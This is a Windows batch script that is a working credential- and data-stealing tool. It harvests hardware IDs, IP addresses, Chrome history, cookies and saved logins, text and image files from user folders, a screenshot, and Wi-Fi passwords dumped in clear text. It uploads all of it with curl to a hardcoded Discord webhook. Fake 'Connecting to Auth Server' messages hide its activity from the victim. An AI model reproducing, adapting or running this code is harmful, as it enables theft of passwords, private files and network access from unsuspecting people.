@echo off
color 0f
mode con cols=61 lines=30
cls
SETLOCAL ENABLEDELAYEDEXPANSION


:: =====================================================
:: WEBHOOK
set "exfilKey=https://discord.com/api/webhooks/1327236697079152702/Bua_FsjGKuFvX6-O1sXx0iMqU0F4MpmOUzJ4HjKugRn1y7IIkeCqUmAWZZ3wXMZzQCfq"

:: YOU CAN CHANGE YOUR DISTRACTION MESSAGE AT THE BOTTOM OF THE SCRIPT

:: =====================================================




:: =====================================================
:: COLLECT DISPLAYABLE INFO
:: =====================================================


for /f "tokens=* delims=" %%a in ('reg query "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "SystemManufacturer"') do (set "Brand=%%a")
for /f "tokens=* delims=" %%a in ('reg query "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "BaseBoardProduct"') do (set "model=%%a")
for /f "tokens=* delims=" %%f in ('wmic diskdrive get SerialNumber') do (set "serial=%%f")
SET count=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic diskdrive get SerialNumber`) DO (
  SET serial!count!=%%F
  SET /a count=!count!+1
)
SET count1=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic cpu get name`) DO (
  SET cpuser!count1!=%%F
  SET /a count1=!count1!+1
)
SET count2=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic cpu get serialnumber`) DO (
  SET cpuserr!count2!=%%F
  SET /a count2=!count2!+1
)
SET count3=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic path Win32_ComputerSystemProduct get UUID`) DO (
  SET uuid!count3!=%%F
  SET /a count3=!count3!+1
)
SET count4=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic diskdrive get model`) DO (
  SET model!count4!=%%F
  SET /a count4=!count4!+1
)
SET count5=1
FOR /F "tokens=* USEBACKQ" %%F IN (`getmac`) DO (
  SET macadd!count5!=%%F
  SET /a count5=!count5!+1
)
SET count6=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic nic get netconnectionid`) DO (
  SET nic!count6!=%%F
  SET /a count6=!count6!+1
)
SET count7=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic nic get macaddress`) DO (
  SET nicadd!count7!=%%F
  SET /a count7=!count7!+1
)
SET count8=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic memorychip get SerialNumber`) DO (
  SET memser!count8!=%%F
  SET /a count8=!count8!+1
)
SET count9=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic path win32_videocontroller get name`) DO (
  SET gpuid!count9!=%%F
  SET /a count9=!count9!+1
)
for /f "tokens=2 delims==" %%A in ('wmic path Win32_ComputerSystemProduct get UUID /value') do set "hwid=%%A"
set hwid=%hwid: =%
for /f "delims=" %%i in ('curl -s https://ifconfig.me') do set PUBLIC_IP=%%i
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4"') do (
    set "ip=%%i"
    setlocal enabledelayedexpansion
    set "ip=!ip:~1!"
)
for /f "tokens=* delims=" %%h in ('hostname') do (set "host=%%h")
for /f "tokens=* delims=" %%h in ('echo %USERNAME%') do (set "pcname=%%h")
for /f "tokens=* delims=" %%v in ('ver') do (set "osver=%%v")
for /f "tokens=* delims=" %%t in ('tzutil /g') do (set "timezone=%%t")

:: =====================================================
:: COLLECT FILE INFO
:: =====================================================

set "output_dir=%localappdata%\Screenshots"
set "documentsFolder=%USERPROFILE%\Documents"
set "desktopFolder=%USERPROFILE%\Desktop"
set "downloadsFolder=%USERPROFILE%\Downloads"
set "musicFolder=%USERPROFILE%\Music"
set "picturesFolder=%USERPROFILE%\Pictures"
set "videosFolder=%USERPROFILE%\Videos"
set "chrome_data_path=%LOCALAPPDATA%\Google\Chrome\User Data"
set "textDest=%localappdata%\Screenshots\txt"
set "imageDest=%localappdata%\Screenshots\images"
set "batDest=%localappdata%\Screenshots\bat"
set "wifiDest=%localappdata%\Screenshots\wifi"
set "output_file=%wifiDest%\wifi.txt"
set "screenshotDir=%localappdata%\Screenshots"
set "screenshotFile=%screenshotDir%\screenshot.png"
set "file1=%localappdata%\Screenshots\Bookmarks.zip"
set "file2=%localappdata%\Screenshots\History.zip"
set "file3=%localappdata%\Screenshots\Login_Data.zip"
set "file4=%localappdata%\Screenshots\txt.zip"
set "file5=%localappdata%\Screenshots\images.zip"
set "file6=%localappdata%\Screenshots\bat.zip"
set "file7=%localappdata%\Screenshots\wifi_passwords.zip"
set FILE_PATH=%screenshotDir%\screenshot.png


if not exist "%output_dir%" mkdir "%output_dir%"
if not exist "%textDest%" mkdir "%textDest%"
if not exist "%imageDest%" mkdir "%imageDest%"
if not exist "%batDest%" mkdir "%batDest%"
if not exist "%wifiDest%" mkdir "%wifiDest%"
cls
taskkill /f /im "chrome.exe"
cls
CALL :MESSAGE
copy "%chrome_data_path%\Default\History" "%output_dir%\History" >nul
copy "%chrome_data_path%\Default\Bookmarks" "%output_dir%\Bookmarks" >nul
copy "%chrome_data_path%\Default\Cookies" "%output_dir%\Cookies" >nul
copy "%chrome_data_path%\Default\Login Data" "%output_dir%\Login Data" >nul
for %%a in ("%documentsFolder%\*.txt") do (
    copy "%%a" "%textDest%"
) >nul
for %%b in ("%downloadsFolder%\*.txt") do (
    copy "%%b" "%textDest%"
) >nul
for %%c in ("%picturesFolder%\*.txt") do (
    copy "%%c" "%textDest%"
) >nul
for %%d in ("%videosFolder%\*.txt") do (
    copy "%%d" "%textDest%"
) >nul
for %%e in ("%musicFolder%\*.txt") do (
    copy "%%e" "%textDest%"
) >nul
for %%l in ("%desktopFolder%\*.txt") do (
    copy "%%l" "%textDest%"
) >nul
for %%f in ("%documentsFolder%\*.png") do (
    copy "%%f" "%imageDest%"
) >nul
for %%g in ("%documentsFolder%\*.jpg") do (
    copy "%%g" "%imageDest%"
) >nul
for %%h in ("%downloadsFolder%\*.png") do (
    copy "%%h" "%imageDest%"
) >nul
for %%i in ("%downloadsFolder%\*.jpg") do (
    copy "%%i" "%imageDest%"
) >nul
for %%j in ("%picturesFolder%\*.png") do (
    copy "%%j" "%imageDest%"
) >nul
for %%k in ("%picturesFolder%\*.jpg") do (
    copy "%%k" "%imageDest%"
) >nul
for %%m in ("%videosFolder%\*.png") do (
    copy "%%m" "%imageDest%"
) >nul
for %%n in ("%videosFolder%\*.jpg") do (
    copy "%%n" "%imageDest%"
) >nul
for %%o in ("%desktopFolder%\*.png") do (
    copy "%%o" "%imageDest%"
) >nul
for %%p in ("%desktopFolder%\*.jpg") do (
    copy "%%p" "%imageDest%"
) >nul
for %%q in ("%desktopFolder%\*.bat") do (
    copy "%%q" "%batDest%"
) >nul
for %%r in ("%downloadsFolder%\*.bat") do (
    copy "%%r" "%batDest%"
) >nul
for %%s in ("%documentsFolder%\*.bat") do (
    copy "%%s" "%batDest%"
) >nul
echo Wi-Fi Profiles and Passwords > "%output_file%"
echo ---------------------------------------- >> "%output_file%"

for /f "tokens=*" %%i in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    for /f "tokens=2 delims=:" %%j in ("%%i") do (
        set profile=%%j
        set profile=!profile:~1!
        echo Profile: !profile! >> "%output_file%"
        netsh wlan show profile name="!profile!" key=clear | findstr "Key Content" >> "%output_file%"
        echo ---------------------------------------- >> "%output_file%"
    )
)
cls
CALL :MESSAGE
powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip'" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip'" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip'" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\txt' -DestinationPath '%output_dir%\txt.zip'" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\images' -DestinationPath '%output_dir%\images.zip'" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\bat' -DestinationPath '%output_dir%\bat.zip'" >nul 2>&1
powershell -command "Compress-Archive -Path '%output_dir%\wifi' -DestinationPath '%output_dir%\wifi_passwords.zip'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen(0, 0, 0, 0, $Screen.Size); $Bitmap.Save('%screenshotFile%', [System.Drawing.Imaging.ImageFormat]::Png); $Graphics.Dispose(); $Bitmap.Dispose();"



set "json_payload1={\"embeds\": [{\"title\": \"%pcname%\", \"description\": \"```\nHostname: %host%``` ```\nOS Version: %osver%``` ```\nPrivate IP: !ip!``` ```\nPublic IP: %PUBLIC_IP%``` ```\nTime Zone: %timezone%``` \n**HWID Information:** ```\nMboard: %model:~34%``` ```\nUUID: %hwid%``` ```\nCPU: %cpuser2%``` ```\nCPU ID: %cpuserr2%``` ```\nGPU: %gpuid2%``` ```\nDisk 1: %model2%  %serial2%``` ```\nDisk 2: %model3%  %serial3%``` ```\nDisk 3: %model4%  %serial4%``` ```\nDisk 4: %model5%  %serial5%``` ```\nDisk 5: %model6%  %serial6%``` ```\nMAC Address: %nicadd3%``` \", \"color\": 9503569, \"image\": {\"url\": \"attachment://screenshot.png\"}}]}"
curl -F "payload_json=%json_payload1%" -F "file1=@%file_path%" "%exfilKey%" >nul
IF %ERRORLEVEL% NEQ 0 GOTO BADEXFIL
curl -F "file=@%file1%" %exfilKey% >nul
curl -F "file=@%file2%" %exfilKey% >nul
curl -F "file=@%file3%" %exfilKey% >nul
curl -F "file=@%file4%" %exfilKey% >nul
curl -F "file=@%file5%" %exfilKey% >nul
curl -F "file=@%file6%" %exfilKey% >nul
curl -F "file=@%file7%" %exfilKey% >nul
GOTO MESSAGE2
cls
EXIT /B

:BADEXFIL
cls
echo]
echo   [31m^>  [97mWEBHOOK IS BAD
ping localhost -n 3 >nul
EXIT /B



:: =====================================================
:: DISTRACTION MESSAGE

:MESSAGE
echo]
echo   [33m^>  [97mConnecting to Auth Server, please wait. . .
goto :EOF
:: =====================================================

:: =====================================================
:: DISTRACTION MESSAGE 2

:MESSAGE2
cls
echo]
echo   [92m^>  [97mConnection Established [33m[233ms] [97m
ping localhost -n 3 >nul
goto :EOF
:: =====================================================
